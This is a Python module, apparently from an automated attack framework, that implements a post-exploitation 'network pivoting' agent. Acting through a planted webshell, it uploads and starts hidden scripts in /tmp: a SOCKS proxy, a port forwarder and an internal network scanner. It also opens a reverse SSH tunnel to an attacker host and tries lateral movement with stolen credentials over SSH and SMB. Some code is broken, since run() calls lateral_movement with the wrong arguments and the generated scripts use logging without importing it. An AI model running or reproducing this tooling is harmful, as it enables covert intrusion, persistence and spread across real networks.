from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Network Pivoting Agent
สร้าง tunnels และ pivots เพื่อเข้าถึงเครือข่ายภายใน
"""

import asyncio
import socket
import struct
import os
from typing import Dict, List, Optional
import logging

log = logging.getLogger(__name__)

# Get default shell password from environment variable
DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')


class NetworkPivot:
    """Network pivoting agent"""
    
    def __init__(self, webshell_manager=None):
        self.webshell = webshell_manager
        self.active_tunnels = []
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for NetworkPivot
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.lateral_movement(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[NetworkPivot] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def create_socks_proxy(self, shell_url: str, shell_password: str, local_port: int = 1080) -> Dict:
        """
        Create SOCKS proxy through webshell
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            local_port: Local SOCKS port
        
        Returns:
            Dict with proxy information
        """
        
        log.info(f"[Pivot] Creating SOCKS proxy on port {local_port}")
        
        # Deploy SOCKS proxy script on target
        socks_script = self._generate_socks_proxy_script()
        
        # Upload script
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'cat > /tmp/.socks_proxy.py << \'EOF\'\n{socks_script}\nEOF'
        )
        
        if not result.get('success'):
            return {
                'success': False,
                'error': 'Failed to upload SOCKS proxy script'
            }
        
        # Start SOCKS proxy on target
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'nohup python3 /tmp/.socks_proxy.py {local_port} > /dev/null 2>&1 &'
        )
        
        tunnel_info = {
            'success': True,
            'type': 'socks_proxy',
            'local_port': local_port,
            'target': shell_url,
            'usage': f'proxychains -f proxychains.conf <command>'
        }
        
        self.active_tunnels.append(tunnel_info)
        
        return tunnel_info
    
    async def create_port_forward(
        self,
        shell_url: str,
        shell_password: str,
        local_port: int,
        remote_host: str,
        remote_port: int
    ) -> Dict:
        """
        Create port forwarding through webshell
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            local_port: Local port to listen
            remote_host: Remote host to forward to
            remote_port: Remote port to forward to
        
        Returns:
            Dict with forwarding information
        """
        
        log.info(f"[Pivot] Creating port forward {local_port} -> {remote_host}:{remote_port}")
        
        # Deploy port forward script
        forward_script = self._generate_port_forward_script(remote_host, remote_port)
        
        # Upload script
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'cat > /tmp/.port_forward.py << \'EOF\'\n{forward_script}\nEOF'
        )
        
        if not result.get('success'):
            return {
                'success': False,
                'error': 'Failed to upload port forward script'
            }
        
        # Start port forward on target
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'nohup python3 /tmp/.port_forward.py {local_port} > /dev/null 2>&1 &'
        )
        
        tunnel_info = {
            'success': True,
            'type': 'port_forward',
            'local_port': local_port,
            'remote_host': remote_host,
            'remote_port': remote_port,
            'target': shell_url,
            'usage': f'Connect to localhost:{local_port} to access {remote_host}:{remote_port}'
        }
        
        self.active_tunnels.append(tunnel_info)
        
        return tunnel_info
    
    async def create_reverse_tunnel(
        self,
        shell_url: str,
        shell_password: str,
        attacker_host: str,
        attacker_port: int
    ) -> Dict:
        """
        Create reverse SSH tunnel
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            attacker_host: Attacker's host
            attacker_port: Attacker's port
        
        Returns:
            Dict with tunnel information
        """
        
        log.info(f"[Pivot] Creating reverse tunnel to {attacker_host}:{attacker_port}")
        
        # Check if SSH is available
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'which ssh'
        )
        
        if not result.get('output'):
            return {
                'success': False,
                'error': 'SSH not available on target'
            }
        
        # Create reverse SSH tunnel
        # ssh -R <attacker_port>:localhost:22 user@attacker_host
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'nohup ssh -o StrictHostKeyChecking=no -R {attacker_port}:localhost:22 user@{attacker_host} > /dev/null 2>&1 &'
        )
        
        tunnel_info = {
            'success': True,
            'type': 'reverse_ssh_tunnel',
            'attacker_host': attacker_host,
            'attacker_port': attacker_port,
            'target': shell_url,
            'usage': f'ssh -p {attacker_port} user@localhost'
        }
        
        self.active_tunnels.append(tunnel_info)
        
        return tunnel_info
    
    async def scan_internal_network(
        self,
        shell_url: str,
        shell_password: str,
        network: str = '192.168.1.0/24'
    ) -> Dict:
        """
        Scan internal network from compromised host
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            network: Network to scan (CIDR notation)
        
        Returns:
            Dict with scan results
        """
        
        log.info(f"[Pivot] Scanning internal network: {network}")
        
        # Deploy network scanner
        scanner_script = self._generate_network_scanner_script(network)
        
        # Upload scanner
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'cat > /tmp/.network_scanner.py << \'EOF\'\n{scanner_script}\nEOF'
        )
        
        # Run scanner
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'python3 /tmp/.network_scanner.py'
        )
        
        output = result.get('output', '')
        
        # Parse scan results
        hosts = []
        for line in output.split('\n'):
            if 'Host:' in line:
                parts = line.split()
                if len(parts) >= 4:
                    hosts.append({
                        'ip': parts[1],
                        'ports': parts[3].split(',') if len(parts) > 3 else []
                    })
        
        return {
            'success': True,
            'network': network,
            'hosts_found': len(hosts),
            'hosts': hosts
        }
    
    async def lateral_movement(
        self,
        shell_url: str,
        shell_password: str,
        target_host: str,
        credentials: Dict
    ) -> Dict:
        """
        Perform lateral movement to another host
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            target_host: Target host IP
            credentials: Dict with username/password or ssh_key
        
        Returns:
            Dict with lateral movement results
        """
        
        log.info(f"[Pivot] Lateral movement to {target_host}")
        
        results = []
        
        # Try SSH with password
        if 'username' in credentials and 'password' in credentials:
            result = await self._try_ssh_password(
                shell_url,
                shell_password,
                target_host,
                credentials['username'],
                credentials['password']
            )
            
            if result.get('success'):
                results.append(result)
        
        # Try SSH with key
        if 'ssh_key' in credentials:
            result = await self._try_ssh_key(
                shell_url,
                shell_password,
                target_host,
                credentials.get('username', 'root'),
                credentials['ssh_key']
            )
            
            if result.get('success'):
                results.append(result)
        
        # Try SMB (Windows)
        if 'username' in credentials and 'password' in credentials:
            result = await self._try_smb(
                shell_url,
                shell_password,
                target_host,
                credentials['username'],
                credentials['password']
            )
            
            if result.get('success'):
                results.append(result)
        
        return {
            'success': len(results) > 0,
            'target_host': target_host,
            'methods_succeeded': len(results),
            'results': results
        }
    
    async def _try_ssh_password(
        self,
        shell_url: str,
        shell_password: str,
        target_host: str,
        username: str,
        password: str
    ) -> Dict:
        """Try SSH with password"""
        
        # Use sshpass for password authentication
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_host} "whoami"'
        )
        
        output = result.get('output', '')
        
        if username in output or 'root' in output:
            return {
                'success': True,
                'method': 'ssh_password',
                'target': target_host,
                'username': username
            }
        
        return {'success': False}
    
    async def _try_ssh_key(
        self,
        shell_url: str,
        shell_password: str,
        target_host: str,
        username: str,
        ssh_key: str
    ) -> Dict:
        """Try SSH with private key"""
        
        # Write SSH key to temp file
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'cat > /tmp/.ssh_key << \'EOF\'\n{ssh_key}\nEOF && chmod 600 /tmp/.ssh_key'
        )
        
        # Try SSH with key
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'ssh -i /tmp/.ssh_key -o StrictHostKeyChecking=no {username}@{target_host} "whoami"'
        )
        
        output = result.get('output', '')
        
        if username in output or 'root' in output:
            return {
                'success': True,
                'method': 'ssh_key',
                'target': target_host,
                'username': username
            }
        
        return {'success': False}
    
    async def _try_smb(
        self,
        shell_url: str,
        shell_password: str,
        target_host: str,
        username: str,
        password: str
    ) -> Dict:
        """Try SMB connection"""
        
        # Use smbclient
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'smbclient -U "{username}%{password}" //{target_host}/C$ -c "dir"'
        )
        
        output = result.get('output', '')
        
        if 'blocks of size' in output or 'blocks available' in output:
            return {
                'success': True,
                'method': 'smb',
                'target': target_host,
                'username': username
            }
        
        return {'success': False}
    
    def _generate_socks_proxy_script(self) -> str:
        """Generate SOCKS proxy Python script"""
        
        script = '''#!/usr/bin/env python3
import socket
import struct
import threading
import sys

def handle_client(client_socket):
    # SOCKS5 handshake
    version, nmethods = struct.unpack("!BB", client_socket.recv(2))
    methods = client_socket.recv(nmethods)
    
    # No authentication
    client_socket.sendall(struct.pack("!BB", 5, 0))
    
    # Request
    version, cmd, _, address_type = struct.unpack("!BBBB", client_socket.recv(4))
    
    if address_type == 1:  # IPv4
        address = socket.inet_ntoa(client_socket.recv(4))
    elif address_type == 3:  # Domain
        domain_length = client_socket.recv(1)[0]
        address = client_socket.recv(domain_length).decode()
    
    port = struct.unpack('!H', client_socket.recv(2))[0]
    
    try:
        # Connect to target
        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_socket.connect((address, port))
        
        # Send success
        bind_address = socket.inet_aton("0.0.0.0")
        client_socket.sendall(struct.pack("!BBBBIH", 5, 0, 0, 1, 0, 0))
        
        # Forward data
        def forward(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception as e:
                logging.error("Error occurred")
        
        t1 = threading.Thread(target=forward, args=(client_socket, remote_socket))
        t2 = threading.Thread(target=forward, args=(remote_socket, client_socket))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    
    except Exception as e:
        # Send error
        client_socket.sendall(struct.pack("!BBBBIH", 5, 1, 0, 1, 0, 0))
    
    finally:
        client_socket.close()
        try:
            remote_socket.close()
        except Exception as e:
            logging.error("Error occurred")

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 1080
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client,)).start()

if __name__ == "__main__":
    main()
'''
        return script
    
    def _generate_port_forward_script(self, remote_host: str, remote_port: int) -> str:
        """Generate port forwarding Python script"""
        
        script = f'''#!/usr/bin/env python3
import socket
import threading
import sys

REMOTE_HOST = "{remote_host}"
REMOTE_PORT = {remote_port}

def forward(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception as e:
        logging.error("Error occurred")
    finally:
        src.close()
        dst.close()

def handle_client(client_socket):
    try:
        # Connect to remote
        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_socket.connect((REMOTE_HOST, REMOTE_PORT))
        
        # Forward data
        t1 = threading.Thread(target=forward, args=(client_socket, remote_socket))
        t2 = threading.Thread(target=forward, args=(remote_socket, client_socket))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    
    except Exception as e:
        client_socket.close()

def main():
    local_port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", local_port))
    server.listen(5)
    
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client,)).start()

if __name__ == "__main__":
    main()
'''
        return script
    
    def _generate_network_scanner_script(self, network: str) -> str:
        """Generate network scanner Python script"""
        
        script = f'''#!/usr/bin/env python3
import socket
import ipaddress

NETWORK = "{network}"
COMMON_PORTS = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 8080]

def scan_host(ip):
    open_ports = []
    
    for port in COMMON_PORTS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((str(ip), port))
            
            if result == 0:
                open_ports.append(port)
            
            sock.close()
        except Exception as e:
            logging.error("Error occurred")
    
    if open_ports:
        print(f"Host: {{ip}} Ports: {{','.join(map(str, open_ports))}}")

def main():
    network = ipaddress.ip_network(NETWORK, strict=False)
    
    for ip in network.hosts():
        scan_host(ip)

if __name__ == "__main__":
    main()
'''
        return script
    
    def list_active_tunnels(self) -> List[Dict]:
        """List all active tunnels"""
        return self.active_tunnels


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from agents.post_exploitation.webshell_manager import WebshellManager
        
        webshell = WebshellManager()
        pivot = NetworkPivot(webshell)
        
        # Create SOCKS proxy
        result = await pivot.create_socks_proxy(
            shell_url="http://target.com/shell.php",
            shell_password=DEFAULT_SHELL_PASSWORD,
            local_port=1080
        )
        
        print(f"SOCKS proxy: {result}")
        
        # Scan internal network
        scan_result = await pivot.scan_internal_network(
            shell_url="http://target.com/shell.php",
            shell_password=DEFAULT_SHELL_PASSWORD,
            network="192.168.1.0/24"
        )
        
        print(f"Hosts found: {scan_result['hosts_found']}")
    
    asyncio.run(test())

